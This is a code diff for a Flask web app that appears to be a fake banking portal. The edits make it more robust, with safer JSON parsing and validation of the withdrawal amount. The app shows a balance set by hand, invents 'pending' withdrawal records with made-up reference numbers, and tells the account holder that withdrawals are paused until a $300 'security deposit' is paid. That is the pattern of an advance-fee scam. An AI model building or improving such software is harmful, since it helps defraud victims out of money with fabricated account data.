@@ -1,4 +1,4 @@
-;from flask import Flask, render_template, request, redirect, url_for, flash, jsonify
+from flask import Flask, render_template, request, redirect, url_for, flash, jsonify
 from flask_login import LoginManager, login_user, logout_user, login_required, UserMixin, current_user
 from markupsafe import escape
 from datetime import datetime
@@ -131,7 +131,6 @@ account_data = {
     ]
 }
 
-# process transactions ONLY (balance stays manual)
 account_data['transactions'] = sort_transactions(account_data['transactions'])
 account_data['transactions'] = add_running_balance(account_data['transactions'])
 
@@ -189,7 +188,7 @@ chats = []
 @app.route("/chat/send", methods=["POST"])
 @login_required
 def send_chat():
-    data = request.get_json()
+    data = request.get_json() or {}
     message = (data.get("message") or "").strip()
     sender = data.get("from")
     if not message:
@@ -214,9 +213,7 @@ def send_chat():
 @app.route("/chat/feed", methods=["GET"])
 @login_required
 def chat_feed():
-    return jsonify({
-        "chats": chats[-100:]
-    })
+    return jsonify({"chats": chats[-100:]})
 
 @app.route('/card-details')
 @login_required
@@ -242,28 +239,28 @@ def withdraw():
         message = 'Withdrawal paused over inability for over 30 days. A $300 security deposit is required to reactivate withdrawal.'
     return render_template('withdraw.html', account=account_data, message=message)
 
-# --- NEW ROUTE ADDED HERE TO FIX YOUR ERROR AND UPDATE HISTORY ---
 @app.route('/withdraw/submit', methods=['POST'])
 @login_required
 def submit_withdrawal():
-    data = request.get_json()
-    amount = float(data.get('amount', 0))
+    data = request.get_json() or {}
+    try:
+        amount = float(data.get('amount', 0))
+    except (TypeError, ValueError):
+        return jsonify({"ok": False, "error": "Invalid amount"}), 400
+
     method = data.get('method', 'cashapp')
     destination = data.get('destination', '')
 
     if amount <= 0:
         return jsonify({"ok": False, "error": "Invalid amount"}), 400
 
-    # Generate Reference
     ref = 'PHX-' + str(uuid.uuid4()).split('-')[0].upper()
 
-    # Update Balance
     global MANUAL_BALANCE
     MANUAL_BALANCE -= amount
     account_data['balance'] = MANUAL_BALANCE
     account_data['formatted_balance'] = format_balance(MANUAL_BALANCE)
 
-    # Create the new pending transaction
     new_txn = {
         'id': ref,
         'date': datetime.now().strftime("%Y-%m-%d"),
@@ -274,7 +271,6 @@ def submit_withdrawal():
         'description': f'Pending transfer to {destination}'
     }
 
-    # Add to history and re-calculate balances
     account_data['transactions'].append(new_txn)
     account_data['transactions'] = sort_transactions(account_data['transactions'])
     account_data['transactions'] = add_running_balance(account_data['transactions'])
